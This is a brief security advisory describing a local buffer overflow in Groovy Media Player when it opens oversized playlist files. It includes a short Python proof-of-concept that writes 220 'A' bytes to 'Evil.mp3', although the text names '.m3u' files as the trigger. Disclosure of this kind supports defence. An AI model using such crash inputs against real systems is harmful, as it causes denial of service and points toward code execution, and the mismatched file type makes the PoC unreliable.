4.4 (AV:L/AC:M/Au:N/C:P/I:P/A:P/E:P/RL:U/RC:C)


Details:
=======
Vulnerability Description : Groovy media player is vulnerable to buffer overflow vulnerability.The software performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.Certain languages allow direct addressing of memory locations and do not automatically ensure that these locations are valid for the memory buffer that is being referenced. This can cause read or write operations to be performed on memory locations that may be associated with other variables, data structures, or internal program data.

Impact : Groovy Media Player is prone to a local buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied input. Specifically, this issue occurs when opening a '.m3u' playlist file that contains excessive data.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

================


POC Exploit code:

# !/usr/bin/python

filename = "Evil.mp3"
 
buffer = "\x41" * 220
exploit = buffer
 
textfile = open(filename , 'w')
textfile.write(exploit)
textfile.close()


Risk:
=====

The security risk of the Local Buffer Overflow Vulnerability is estimated as moderate.
